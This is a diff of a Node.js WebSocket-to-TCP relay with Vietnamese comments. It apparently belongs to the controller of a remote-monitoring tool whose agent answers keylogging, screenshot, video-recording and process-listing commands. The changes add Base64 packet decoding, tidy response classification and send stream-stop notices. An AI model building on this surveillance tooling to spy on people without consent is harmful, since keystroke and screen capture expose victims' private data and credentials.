@@ -94,31 +94,37 @@ function connectCmdTcp() {
 }
 
 function handleTcpResponse(ws, line) {
-  if (line.startsWith("JSON ")) {
-    const jsonPayload = line.substring(5);
+  let jsonString = line;
+
+  // 1. Neu la goi tin Base64 (phien ban moi), giai ma truoc
+  if (line.startsWith("B64:")) {
+    try {
+      const b64 = line.substring(4); // Bo chu "B64:"
+      jsonString = Buffer.from(b64, "base64").toString("utf-8");
+    } catch (e) {
+      console.error(`[SYSTEM] [TCP->WS] Loi Decode Base64: ${e.message}`);
+      return;
+    }
+  }
+
+  // 2. Xu ly JSON nhu binh thuong
+  if (jsonString.startsWith("JSON ")) {
+    const jsonPayload = jsonString.substring(5);
     try {
       const data = JSON.parse(jsonPayload);
       let command = "UNKNOWN";
+
       if (data.log !== undefined) command = "GET_KEYLOG";
       else if (data.path !== undefined) command = "RECORD_VIDEO";
       else if (data.video !== undefined) command = "GET_DEVICES";
       else if (data.payload !== undefined) command = "GET_SCREENSHOT";
-      else if (
-        Array.isArray(data) &&
-        data.length > 0 &&
-        data[0] &&
-        data[0].hwnd !== undefined
-      )
-        command = "GET_APPS";
-      else if (
-        Array.isArray(data) &&
-        data.length > 0 &&
-        data[0] &&
-        data[0].exe !== undefined
-      )
-        command = "GET_PROCS";
-      else if (Array.isArray(data)) command = "GET_APPS";
-      else if (data.ok) command = "COMMAND_OK";
+      else if (Array.isArray(data)) {
+        if (data.length > 0 && data[0].hwnd !== undefined) command = "GET_APPS";
+        else if (data.length > 0 && data[0].exe !== undefined)
+          command = "GET_PROCS";
+        else command = "GET_APPS";
+      } else if (data.ok) command = "COMMAND_OK";
+
       const payloadToSend = command === "GET_SCREENSHOT" ? data.payload : data;
       ws.send(
         JSON.stringify({
@@ -129,6 +135,8 @@ function handleTcpResponse(ws, line) {
       );
     } catch (e) {
       console.error(`[SYSTEM] [TCP->WS] Loi parse JSON phan hoi: ${e.message}`);
+      // Log mot phan payload de debug neu can
+      console.error(`[DEBUG] Bad Payload: ${jsonPayload.substring(0, 50)}...`);
     }
   }
 }
@@ -325,10 +333,16 @@ wss.on("connection", (ws, req) => {
       streamTcp.on("close", () => {
         console.log(`[${clientInfo}] [STREAM_TCP] Da dong stream.`);
         activeStreamSockets.delete(streamTcp);
+        if (ws.readyState === WebSocket.OPEN) {
+          ws.send(JSON.stringify({ type: "stream_stop" }));
+        }
       });
       streamTcp.on("error", (err) => {
         console.error(`[${clientInfo}] [STREAM_TCP] Loi: ${err.message}`);
         activeStreamSockets.delete(streamTcp);
+        if (ws.readyState === WebSocket.OPEN) {
+          ws.send(JSON.stringify({ type: "stream_stop" }));
+        }
       });
     } else {
       if (!cmdTcp || cmdTcp.destroyed) {
